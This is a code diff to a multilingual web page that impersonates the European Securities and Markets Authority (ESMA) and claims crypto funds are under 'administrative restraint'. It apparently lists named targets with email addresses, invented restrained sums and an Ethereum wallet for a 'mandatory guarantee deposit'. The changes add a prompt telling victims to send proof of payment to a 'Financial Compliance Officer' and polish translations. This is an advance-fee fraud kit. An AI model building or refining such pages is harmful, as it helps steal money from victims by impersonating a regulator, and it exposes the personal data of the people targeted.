@@ -64,7 +64,7 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 .copy-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; color: var(--eu-blue); cursor: pointer; font-size: 20px; }
 
 .modal-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
-.modal-box { background: white; padding: 40px; max-width: 550px; border-radius: 4px; }
+.modal-box { background: white; padding: 40px; max-width: 550px; border-radius: 4px; text-align: left; }
 
 footer { background: var(--eu-blue); color: #fff; padding: 50px 10%; margin-top: 80px; font-size: 13px; text-align: center; }
 footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
@@ -130,15 +130,15 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
     <div id="phase3" class="phase">
       <div class="status-header">
         <span style="font-size: 13px; font-weight: 700; color: var(--text-muted);" data-i18n="p3Header">TOTAL RESTRAINED CAPITAL</span>
-        <span class="amount-text" id="p3Amount">51.46 ETH</span>
-        <span class="sub-fiat-text" id="p3FiatSub">≈ Calculating...</span>
+        <span class="amount-text" id="p3Amount">108,357.00 EUR</span>
+        <span class="sub-fiat-text" id="p3EthSub">≈ Calculating...</span>
         <span style="color: var(--danger); font-weight: 700;"><i class="fas fa-lock"></i> <span data-i18n="p3Status">STATUS: ADMINISTRATIVE RESTRAINT</span></span>
       </div>
       <h4 style="border-bottom: 1px solid var(--border); padding-bottom: 10px;" data-i18n="p3DetailsTitle">Beneficiary Details</h4>
       <table class="official-table">
         <tr><td data-i18n="tblName">Full Legal Name:</td><td><strong id="p3Name">Tim Peter Stahl</strong></td></tr>
         <tr><td data-i18n="tblRef">Registry Reference:</td><td><strong id="p3Ref">EU-MICA-8829123-00</strong></td></tr>
-        <tr><td data-i18n="tblDate">Date of Asset Restraint:</td><td><strong id="p3Date">September 8th, 2026</strong></td></tr>
+        <tr><td data-i18n="tblDate">Date of Asset Restraint:</td><td><strong id="p3Date">September 7th, 2026</strong></td></tr>
         <tr><td data-i18n="tblAuth">Regulatory Authority:</td><td><strong>ESMA - European Securities and Markets Authority</strong></td></tr>
         <tr><td data-i18n="tblJurisdiction">Jurisdiction:</td><td><strong>EEA / Switzerland Hub</strong></td></tr>
       </table>
@@ -230,7 +230,7 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
             <button class="copy-btn" onclick="copyAddress()"><i class="fas fa-copy"></i></button>
           </div>
 
-          <button class="btn-eu" style="background:var(--success);" onclick="location.reload()" data-i18n="btnConfirmDeposit">CONFIRM DEPOSIT DISPATCHED</button>
+          <button class="btn-eu" style="background:var(--success);" onclick="showDispatchNotification()" data-i18n="btnConfirmDeposit">CONFIRM DEPOSIT DISPATCHED</button>
           <a href="https://www.esma.europa.eu/" style="display:block; text-align:center; margin-top:15px; color:var(--text-muted); font-size:13px; text-decoration:none;" data-i18n="btnCancel">Cancel and return to ESMA Portal</a>
         </div>
       </div>
@@ -239,7 +239,7 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
   </div>
 </div>
 
-<!-- MODAL -->
+<!-- AGREEMENT MODAL -->
 <div class="modal-overlay" id="agreementModal">
   <div class="modal-box">
     <h3 style="margin-top:0; color:var(--eu-blue);" data-i18n="modalTitle">Compliance Affirmation</h3>
@@ -248,6 +248,18 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
       <label for="micaAgree" style="font-weight:400; font-size:14px;" data-i18n="modalText">I acknowledge the <strong>MiCA (Regulation EU 2023/1114)</strong> framework and understand that fund release is strictly contingent upon the verification of the mandatory guarantee deposit.</label>
     </div>
     <button class="btn-eu" onclick="confirmAgreement()" data-i18n="btnModalProceed">PROCEED TO VERIFICATION</button>
+  </div>
+</div>
+
+<!-- DISPATCH NOTIFICATION MODAL -->
+<div class="modal-overlay" id="dispatchNotificationModal">
+  <div class="modal-box" style="text-align: center;">
+    <div style="font-size: 48px; color: var(--success); margin-bottom: 15px;"><i class="fas fa-check-circle"></i></div>
+    <h3 style="margin-top:0; color:var(--eu-blue);" data-i18n="dispatchModalTitle">Deposit Dispatch Recorded</h3>
+    <p style="font-size: 15px; color: var(--text-dark); margin: 20px 0; line-height: 1.6;" data-i18n="dispatchModalText">
+      Please submit your <strong>Proof of Payment</strong> (Transaction Hash / Receipt) directly to your dedicated Financial Compliance Officer to facilitate immediate verification and certificate clearance.
+    </p>
+    <button class="btn-eu" onclick="closeDispatchModal()" data-i18n="btnDispatchClose">ACKNOWLEDGE & CLOSE</button>
   </div>
 </div>
 
@@ -265,8 +277,7 @@ const clients = {
     name: "Tim Peter Stahl",
     email: "tim@laidback.dk",
     ref: "EU-MICA-8829123-00",
-    date: "September 8th, 2026",
-    ethAmount: 51.46,
+    date: "September 7th, 2026",
     currency: "EUR",
     currencySymbol: "€",
     restrainedAmount: 108357.00,
@@ -277,11 +288,10 @@ const clients = {
     name: "Annah Mukansi",
     email: "annemukansi@gmail.com",
     ref: "EU-MICA-9941824-11",
-    date: "September 8th, 2026",
-    ethAmount: 23.26,
+    date: "September 3rd, 2026",
     currency: "USD",
     currencySymbol: "$",
-    restrainedAmount: 58610.00,
+    restrainedAmount: 58610.36,
     guaranteeRate: 0.109, // 10.90%
     wallet: "0x020eE19bf7BBd5F87Fe91fA4245132196D96CfB0"
   }
@@ -348,6 +358,9 @@ const i18n = {
     modalTitle: "Compliance Affirmation",
     modalText: "I acknowledge the <strong>MiCA (Regulation EU 2023/1114)</strong> framework and understand that fund release is strictly contingent upon the verification of the mandatory guarantee deposit.",
     btnModalProceed: "PROCEED TO VERIFICATION",
+    dispatchModalTitle: "Deposit Dispatch Recorded",
+    dispatchModalText: "Please submit your <strong>Proof of Payment</strong> (Transaction Hash / Receipt) directly to your dedicated Financial Compliance Officer to facilitate immediate verification and certificate clearance.",
+    btnDispatchClose: "ACKNOWLEDGE & CLOSE",
     ftrPrivacy: "Privacy Policy",
     ftrLegal: "Legal Notice",
     errFill: "Please fill in all fields.",
@@ -412,6 +425,9 @@ const i18n = {
     modalTitle: "Nalevingsbevestiging",
     modalText: "Ik erken het <strong>MiCA (Verordening EU 2023/1114)</strong> kader en begrijp dat de vrijgave van fondsen strikt afhankelijk is van de verificatie van de verplichte garantieborg.",
     btnModalProceed: "GA NAAR VERIFICATIE",
+    dispatchModalTitle: "Storting Verzending Geregistreerd",
+    dispatchModalText: "Dien uw <strong>Betalingsbewijs</strong> (Transactiehash / Ontvangstbewijs) rechtstreeks in bij uw toegewezen Financial Compliance Officer om directe verificatie en certificaatvrijgave te vergemakkelijken.",
+    btnDispatchClose: "BEVESTIGEN & SLUITEN",
     ftrPrivacy: "Privacybeleid",
     ftrLegal: "Juridische Kennisgeving",
     errFill: "Vul alle velden in.",
@@ -476,6 +492,9 @@ const i18n = {
     modalTitle: "Compliance-Bestätigung",
     modalText: "Ich erkenne den Rahmen der <strong>MiCA (Verordnung EU 2023/1114)</strong> an und verstehe, dass die Freigabe der Mittel strikt von der Verifizierung der obligatorischen Garantiekaution abhängt.",
     btnModalProceed: "WEITER ZUR VERIFIZIERUNG",
+    dispatchModalTitle: "Einzahlungsübermittlung Erfasst",
+    dispatchModalText: "Bitte reichen Sie Ihren <strong>Zahlungsnachweis</strong> (Transaktions-Hash / Quittung) direkt bei Ihrem zuständigen Financial Compliance Officer ein, um eine sofortige Überprüfung und Zertifikatsfreigabe zu ermöglichen.",
+    btnDispatchClose: "BESTÄTIGEN & SCHLIESSEN",
     ftrPrivacy: "Datenschutz-Bestimmungen",
     ftrLegal: "Impressum",
     errFill: "Bitte füllen Sie alle Felder aus.",
@@ -540,6 +559,9 @@ const i18n = {
     modalTitle: "Afirmación de Cumplimiento",
     modalText: "Reconozco el marco <strong>MiCA (Reglamento UE 2023/1114)</strong> y entiendo que la liberación de fondos está estrictamente supeditada a la verificación del depósito de garantía obligatorio.",
     btnModalProceed: "PROCEDER A LA VERIFICACIÓN",
+    dispatchModalTitle: "Envío de Depósito Registrado",
+    dispatchModalText: "Por favor envíe su <strong>Comprobante de Pago</strong> (Hash de Transacción / Recibo) directamente a su Oficial de Cumplimiento Financiero asignado para facilitar la verificación inmediata y la liberación del certificado.",
+    btnDispatchClose: "ACEPTAR Y CERRAR",
     ftrPrivacy: "Política de Privacidad",
     ftrLegal: "Aviso Legal",
     errFill: "Por favor complete todos los campos.",
@@ -594,7 +616,7 @@ const i18n = {
     p7OptionDefault: "-- Sélectionner l'actif --",
     btnGenerate: "GÉNÉRER L'ADRESSE DE DÉPÔT",
     p8Title: "Passerelle de Paiement Séquestre Sécurisée",
-    p8Sub: "Transaction Validada par ESMA / MiCA",
+    p8Sub: "Transaction Validée par ESMA / MiCA",
     p8AmountSend: "MONTANT À ENVOYER",
     p8FiatVal: "VALEUR FIAT",
     p8Network: "RÉSEAU",
@@ -602,8 +624,11 @@ const i18n = {
     btnConfirmDeposit: "CONFIRMER LE DÉPÔT ENVOYÉ",
     btnCancel: "Annuler et retourner au portail ESMA",
     modalTitle: "Affirmation de Conformité",
-    modalText: "Je reconnais le cadre <strong>MiCA (Règlement UE 2023/1114)</strong> et comprends que la libération des fonds est strictly subordonnée à la vérification du dépôt de garantie obligatoire.",
+    modalText: "Je reconnais le cadre <strong>MiCA (Règlement UE 2023/1114)</strong> et comprends que la libération des fonds est strictement subordonnée à la vérification du dépôt de garantie obligatoire.",
     btnModalProceed: "PASSER À LA VÉRIFICATION",
+    dispatchModalTitle: "Envoi du Dépôt Enregistré",
+    dispatchModalText: "Veuillez soumettre votre <strong>Preuve de Paiement</strong> (Hash de Transaction / Reçu) directement à votre Responsable de la Conformité Financière dédié afin de faciliter la vérification immédiate et la délivrance du certificat.",
+    btnDispatchClose: "PRENDRE NOTE ET FERMER",
     ftrPrivacy: "Politique de Confidentialité",
     ftrLegal: "Mentions Légales",
     errFill: "Veuillez remplir tous les champs.",
@@ -696,18 +721,18 @@ function validateUser(){
   populateClientData();
 
   showPhase(2);
-  setTimeout(()=>showPhase(3), 4000); // Updated: 4 Seconds
+  setTimeout(()=>showPhase(3), 4000); // 4 Seconds
 }
 
 function populateClientData() {
   if (!currentClient) return;
 
   const rate = exchangeRates[currentClient.currency] || 2500;
-  const approxFiat = currentClient.ethAmount * rate;
+  const approxEth = (currentClient.restrainedAmount / rate).toFixed(2);
 
-  // Phase 3 Data
-  document.getElementById('p3Amount').innerText = currentClient.ethAmount + " ETH";
-  document.getElementById('p3FiatSub').innerText = "≈ " + formatCurrency(approxFiat, currentClient.currencySymbol) + " " + currentClient.currency;
+  // Phase 3 Data (Fiat Main, ETH Sub)
+  document.getElementById('p3Amount').innerText = formatCurrency(currentClient.restrainedAmount, currentClient.currencySymbol) + " " + currentClient.currency;
+  document.getElementById('p3EthSub').innerText = "≈ " + approxEth + " ETH";
   document.getElementById('p3Name').innerText = currentClient.name;
   document.getElementById('p3Ref').innerText = currentClient.ref;
   document.getElementById('p3Date').innerText = currentClient.date;
@@ -734,7 +759,7 @@ function confirmAgreement(){
   if(!document.getElementById('micaAgree').checked) return alert(dict.errCheck);
   document.getElementById('agreementModal').style.display='none';
   showPhase(4);
-  setTimeout(()=>showPhase(5), 5000); // Updated: 5 Seconds
+  setTimeout(()=>showPhase(5), 5000); // 5 Seconds
 }
 
 function toCalculation(){ showPhase(6); }
@@ -756,6 +781,15 @@ function copyAddress(){
   const dict = i18n[currentLang] || i18n.ENG;
   navigator.clipboard.writeText(document.getElementById('walletAddr').innerText);
   alert(dict.msgCopied);
+}
+
+function showDispatchNotification(){
+  document.getElementById('dispatchNotificationModal').style.display = 'flex';
+}
+
+function closeDispatchModal(){
+  document.getElementById('dispatchNotificationModal').style.display = 'none';
+  location.reload();
 }
 </script>
 </body>
